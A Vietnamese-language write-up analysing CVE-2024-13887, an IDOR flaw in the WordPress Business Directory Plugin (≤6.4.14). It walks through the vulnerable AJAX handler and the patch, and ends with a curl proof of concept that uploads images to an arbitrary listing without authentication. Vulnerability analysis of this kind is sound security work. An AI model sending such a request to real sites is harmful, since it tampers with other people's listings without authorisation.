---
title: CVE-2024-13887 Analysis & POC
description: Security Vulnerability in WordPress Business Directory Plugin.
date: 2025-12-31 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, idor]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Business Directory Plugin – Easy Listing Directories for WordPress** tồn tại lỗ hổng **Insecure Direct Object Reference (IDOR)** trong tất cả các phiên bản từ trước đến **6.4.14**, thông qua hàm `ajax_listing_submit_image_upload` do thiếu kiểm tra hợp lệ đối với một khóa do người dùng kiểm soát. Điều này cho phép kẻ tấn công **chưa xác thực** có thể **tải lên hình ảnh tùy ý vào các listing**.

* **CVE ID**: [CVE-2024-13887](https://www.cve.org/CVERecord?id=CVE-2024-13887)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 6.4.14
* **Patched Versions**: 6.4.15
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Business Directory Plugin](https://wordpress.org/plugins/business-directory-plugin/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Business Directory**:  
    * `6.4.14` – **vulnerable**  
    * `6.4.15` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đăng ký AJAX handler **cho người dùng đã đăng nhập**:

```php {title="class-wpbdp.php v6.4.14" data-open=true hl_lines=[]}
add_action( 'wp_ajax_nopriv_wpbdp-listing-submit-image-upload', array( &$this, 'ajax_listing_submit_image_upload' ) );
```

`wp_ajax_nopriv` là hook dành cho tất cả người dùng, kết cả chưa đăng nhập. Khi có request tới endpoint `/wp-admin/admin-ajax.php` với param `action=wpbdp-listing-submit-image-upload` thì callback `ajax_listing_submit_image_upload` được gọi:

```php {title="class-wpbdp.php v6.4.14" data-open=true hl_lines=[4,6,37]}
public function ajax_listing_submit_image_upload() {
    $res = new WPBDP_AJAX_Response();

    $listing_id = intval( $_REQUEST['listing_id'] );
    ...
    $files  = wpbdp_flatten_files_array( isset( $_FILES['images'] ) ? $_FILES['images'] : array() );
    $errors = array();

    $listing         = WPBDP_Listing::get( $listing_id );
    $slots_available = 0;
    $plan            = $listing->get_fee_plan();
    if ( ! $plan ) {
        return $res->send_error( __( 'Please select a plan before uploading images to the listing', 'business-directory-plugin' ) );
    }

    $slots_available = absint( $plan->fee_images ) - absint( $_POST['images_count'] );
    if ( 0 >= $slots_available ) {
        return $res->send_error( __( 'Can not upload any more images for this listing.', 'business-directory-plugin' ) );
    } elseif ( $slots_available < count( $files ) ) {
        return $res->send_error(
            sprintf(
                _nx(
                    'You\'re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.',
                    'You\'re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.',
                    $slots_available,
                    'listing image upload',
                    'business-directory-plugin'
                ),
                count( $files ),
                $slots_available
            )
        );
    }

    foreach ( $files as $i => $file ) {
        $image_error   = '';
        $attachment_id = wpbdp_media_upload(
            $file,
            true,
            true,
            array(
                'image'      => true,
                'min-size'   => intval( wpbdp_get_option( 'image-min-filesize' ) ) * 1024,
                'max-size'   => intval( wpbdp_get_option( 'image-max-filesize' ) ) * 1024,
                'min-width'  => wpbdp_get_option( 'image-min-width' ),
                'min-height' => wpbdp_get_option( 'image-min-height' ),
            ),
            $image_error
        ); // TODO: handle errors.

        if ( $image_error ) {
            $errors[ $file['name'] ] = $image_error;
        } else {
            $attachments[] = $attachment_id;
        }
    }

    $html = '';
    foreach ( $attachments as $attachment_id ) {
        $html .= wpbdp_render(
            'submit-listing-images-single',
            array(
                'image_id'   => $attachment_id,
                'listing_id' => $listing_id,
            ),
            false
        );
    }

    $has_images = $listing->get_images( 'ids' );
    $listing->set_images( $attachments, true );

    // Maybe set thumbnail if there aren't already images on this listing.
    if ( ! $has_images ) {
        $image_id = reset( $attachments );
        $listing->set_thumbnail_id( $image_id );
    }

    if ( $errors ) {
        $error_msg = '';

        foreach ( $errors as $fname => $error ) {
            $error_msg .= sprintf( '&#149; %s: %s', $fname, $error ) . '<br />';
        }

        $res->add( 'uploadErrors', $error_msg );
    }

    $res->add( 'is_admin', wpbdp_user_is_admin() );
    $res->add( 'slots_available', $slots_available );
    $res->add( 'attachmentIds', $attachments );
    $res->add( 'html', $html );
    $res->send();
}
```

Hàm thực hiện lấy `listing_id` và `images` từ request:

```php
$listing_id = intval( $_REQUEST['listing_id'] );
$files  = wpbdp_flatten_files_array( isset( $_FILES['images'] ) ? $_FILES['images'] : array() );
```

Kết thúc hàm nếu plan chưa được chọn:

```php
$plan = $listing->get_fee_plan();
if ( ! $plan ) {
    return $res->send_error( __( 'Please select a plan before uploading images to the listing', 'business-directory-plugin' ) );
}
```

![Plan](plan.png "Chọn plan")

Sau đó kiểm tra slot còn lại có thể upload:

```php
$slots_available = absint( $plan->fee_images ) - absint( $_POST['images_count'] );
if ( 0 >= $slots_available ) {
    return $res->send_error( __( 'Can not upload any more images for this listing.', 'business-directory-plugin' ) );
} elseif ( $slots_available < count( $files ) ) {
    return $res->send_error(
        sprintf(
            _nx(
                'You\'re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.',
                'You\'re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.',
                $slots_available,
                'listing image upload',
                'business-directory-plugin'
            ),
            count( $files ),
            $slots_available
        )
    );
}
```

![Slot](slot.png "Slot")

Nếu `slot <= 0` thì trả về lỗi. Nếu không, duyệt qua các file và gọi đến `wpbdp_media_upload` để upload file.

```php
foreach ( $files as $i => $file ) {
    $image_error   = '';
    $attachment_id = wpbdp_media_upload(
        $file,
        true,
        true,
        array(
            'image'      => true,
            'min-size'   => intval( wpbdp_get_option( 'image-min-filesize' ) ) * 1024,
            'max-size'   => intval( wpbdp_get_option( 'image-max-filesize' ) ) * 1024,
            'min-width'  => wpbdp_get_option( 'image-min-width' ),
            'min-height' => wpbdp_get_option( 'image-min-height' ),
        ),
        $image_error
    ); // TODO: handle errors.

    if ( $image_error ) {
        $errors[ $file['name'] ] = $image_error;
    } else {
        $attachments[] = $attachment_id;
    }
}
```

Cuối cùng hàm sẽ trả về thông tin upload dạng JSON.

> [!BUG]  
> lỗ hổng xảy ra khi không có sự ràng buộc giữa `listing_id` và người dùng được phép thực hiện upload, attacker có thể thực hiện upload images bất kì thông qua việc thay đổi tham số `listing_id`

Bản vá `v6.4.15` đã triển khai một số biện pháp để khắc phục:

![Patch](patch.png "Bản vá")

* Thực hiện kiểm tra nonce bằng `check_ajax_referer` => chống CSRF
* Kiểm tra owner của listing, nếu không phải sẽ trả về lỗi.
```php
if ( ! wpbdp_user_is_admin() && ! $listing->owned_by_user( get_current_user_id() ) ) {
    return $res->send_error( __( 'You do not have permission to upload images to this listing', 'business-directory-plugin' ) );
}
```

## Flow
{{< mermaid >}}
flowchart TD
A["Unauthenticated Attacker"]
--> B["Send POST request to /wp-admin/admin-ajax.php"]

B --> C["action=wpbdp-listing-submit-image-upload"]

C --> D["WordPress triggers ajax_listing_submit_image_upload()"]

D --> E["No authentication required (wp_ajax_nopriv_)"]

E --> F["Extract listing_id from request"]

F --> G["Load listing object by ID"]

G --> H{"Listing has fee plan?"}

H -- No --> I["Return error: select a plan"]
H -- Yes --> J["Calculate remaining image slots"]

J --> K{"slots_available > 0?"}

K -- No --> L["Return error: no available slots"]
K -- Yes --> M["Process uploaded files"]

M --> N["Call wpbdp_media_upload()"]

N --> O["Attach uploaded image to listing"]

O --> P["Set thumbnail if needed"]

P --> Q["Return success response (JSON)"]

Q --> R["Image successfully attached to arbitrary listing"]

R --> S["IDOR: No ownership / permission validation"]
{{< /mermaid >}}

## Proof of Concept (PoC)
Gửi request:

```sh
curl -X POST http://localhost/wp-admin/admin-ajax.php \
  -F "action=wpbdp-listing-submit-image-upload" \
  -F "listing_id=88" \
  -F "images=@/path/to/image.jpg"
```

## Conclusion

Lỗ hổng CVE-2024-13887 xuất phát từ việc endpoint `wpbdp-listing-submit-image-upload` cho phép truy cập không cần xác thực và không kiểm tra quyền sở hữu `listing_id`. Điều này cho phép attacker upload hình ảnh vào bất kỳ listing hợp lệ nào chỉ bằng cách thay đổi tham số đầu vào. Bản vá 6.4.15 đã khắc phục bằng cách bổ sung kiểm tra nonce và xác thực quyền sở hữu listing.

## Key Takeaways

* IDOR xảy ra do thiếu kiểm tra quyền sở hữu tài nguyên.
* `wp_ajax_nopriv` là điểm tấn công nguy hiểm nếu không có xác thực bổ sung.
* Không nên tin tưởng dữ liệu đầu vào như `listing_id`.
* Luôn kết hợp **authentication + authorization** khi xử lý AJAX endpoint.

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress Business Directory Plugin <= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability) 